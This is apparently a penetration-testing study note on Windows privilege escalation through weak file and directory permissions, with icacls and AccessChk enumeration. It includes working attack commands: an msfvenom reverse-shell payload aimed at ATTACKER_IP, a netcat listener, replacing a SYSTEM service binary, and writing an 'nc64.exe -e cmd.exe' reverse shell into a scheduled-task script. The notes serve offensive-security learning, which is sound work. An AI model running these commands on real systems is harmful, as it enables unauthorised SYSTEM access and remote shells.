
**Weak File and Directory Permissions** occur when a low-privileged user can **modify, replace, or create files/directories that are used by a privileged process**.

The important question is:

> **Can I modify something that a privileged account will execute or use?**

Typical targets:
- Executable files
- Service executables
- Scripts
- Configuration files
- Directories containing privileged programs
- DLLs
- Scheduled-task scripts
    
### Attack Chain
```text
Low-privileged user
        ↓
Find writable file/directory
        ↓
File is used by privileged process
        ↓
Modify / replace the file
        ↓
Privileged process executes it
        ↓
Privilege escalation
```

---

# 1. Check File Permissions

Use:
```cmd
icacls C:\path\file.exe
```

Example:
```text
C:\Program Files\Vulnerable App\app.exe
    BUILTIN\Users:(M)
```
`(M)` means **Modify**.

If our user belongs to `Users`, we may be able to modify the executable.

Useful permissions:

|Permission|Meaning|
|---|---|
|`F`|Full control|
|`M`|Modify|
|`W`|Write|
|`RX`|Read + Execute|
|`R`|Read|
|`X`|Execute|

For privilege escalation, **Write/Modify/Full Control** are particularly interesting.

---

# 2. Check Directory Permissions

```cmd
icacls C:\ProgramData\VulnerableApp
```

A writable directory can be more important than a writable file.

For example:
```text
C:\ProgramData\VulnerableApp
    BUILTIN\Users:(OI)(CI)(M)
```

This means users can modify objects inside the directory.
- `OI` = Object Inherit
- `CI` = Container Inherit
- `M` = Modify

If a privileged application loads an executable, DLL, or configuration file from this directory, it may be exploitable.

---

# 3. AccessChk

A useful tool for finding weak permissions is **AccessChk**.
```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user
```

**AccessChk is a Microsoft Sysinternals tool — third-party, not normally installed by default.**

For a directory:
```cmd
C:\PrivEsc\accesschk.exe /accepteula -d C:\ProgramData\VulnerableApp
```

For a file:
```cmd
C:\PrivEsc\accesschk.exe /accepteula -qwv C:\ProgramData\VulnerableApp\app.exe
```

Look for permissions that allow the current user/group to write or modify the target.

---

# 4. Writable Executable

Suppose enumeration finds:
```text
C:\Program Files\File Permissions Service\filepermservice.exe
```

Check:
```cmd
icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
```

If our user has write/modify permissions, we can potentially replace the executable.

### Create Payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=ATTACKER_IP \
  LPORT=4444 \
  -f exe \
  -o reverse.exe
```

Start listener:
```bash
nc -lvnp 4444
```

Replace the vulnerable executable:
```cmd
copy reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

Then trigger the privileged application/service.

For a service:
```cmd
net start filepermsvc
```

If the service runs as `LocalSystem`, our payload may execute as:
```text
NT AUTHORITY\SYSTEM
```

Verify:
```cmd
whoami
```

---

# 5. Writable Directory

Sometimes the executable itself isn't writable:
```text
app.exe
    Users: RX
```

but its directory is writable:
```text
C:\Program Files\Vulnerable App\
    Users: M
```

This can still be exploitable.

For example, if a privileged application expects:
```text
C:\Program Files\Vulnerable App\helper.exe
```

and we can delete/replace `helper.exe`, we can substitute our own executable.

Check both:
```cmd
icacls "C:\Program Files\Vulnerable App"
icacls "C:\Program Files\Vulnerable App\helper.exe"
```

---

# 6. Weak Permissions on Scripts

Scripts are another common target.

Example:
```text
C:\Tasks\backup.bat
```

Check:
```cmd
icacls C:\Tasks\backup.bat
```

If the current user can modify it:
```cmd
echo whoami > C:\Tasks\backup.bat
```

or, in a lab where code execution is intended:
```cmd
echo C:\Tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\Tasks\backup.bat
```

If a privileged scheduled task executes this script, the commands execute with the scheduled task's privileges.

This overlaps with:
```text
06_Scheduled_Tasks.md
```

The **vulnerability** is the weak file permission; the scheduled task is the **privileged execution mechanism**.

---

# 7. Finding Writable Files

A simple approach is to inspect interesting directories:
```cmd
icacls C:\ProgramData
```

Then investigate applications:
```cmd
dir "C:\ProgramData" /s /b
```

You can also search for executable files:
```cmd
dir C:\ /s /b *.exe 2>nul
```

and scripts:
```cmd
dir C:\ /s /b *.bat 2>nul
dir C:\ /s /b *.cmd 2>nul
dir C:\ /s /b *.ps1 2>nul
```

**`2>nul` suppresses error messages**, which is useful when traversing directories where access is denied.

---

# 8. What Makes a Writable File Interesting?

A writable file by itself is **not enough**.

For privilege escalation, look for this:
```text
Writable file
      +
Privileged process uses the file
      =
Potential privilege escalation
```

For example:
```text
C:\Program Files\App\helper.exe
        ↓
Writable by Users
        ↓
SYSTEM service executes helper.exe
        ↓
Replace helper.exe
        ↓
SYSTEM execution
```

But:
```text
C:\Users\User\Desktop\test.txt
        ↓
Writable
        ↓
Nothing privileged uses it
```

is not useful for privilege escalation.

---

# 9. Common Targets

Prioritize writable:

### Executables
```text
.exe
```

### Scripts
```text
.bat
.cmd
.ps1
.vbs
```

### Configuration files
```text
.ini
.conf
.config
.xml
```

### DLLs
```text
.dll
```

### Application directories
```text
C:\Program Files\
C:\ProgramData\
```

Especially when a **SYSTEM service** or privileged application uses them.

---

# File Permission vs Directory Permission

### Writable File
```text
app.exe
  ↓
Users: Modify
  ↓
Replace/modify app.exe
```

### Writable Directory
```text
C:\App\
  ↓
Users: Modify
  ↓
Create/replace files inside
  ↓
Privileged program uses file
```

A writable directory can sometimes be more useful because it allows us to **create or replace files** even when the target executable itself isn't directly writable.

---
## Important

Don't confuse **weak permissions** with the other techniques:
```text
Writable service executable
        → 03_Service_Exploitation.md

Writable scheduled-task script
        → 06_Scheduled_Tasks.md

Writable DLL search location
        → 08_DLL_Hijacking.md

Writable PATH directory
        → 09_Path_Hijacking.md

Writable registry key
        → 05_Registry.md
```

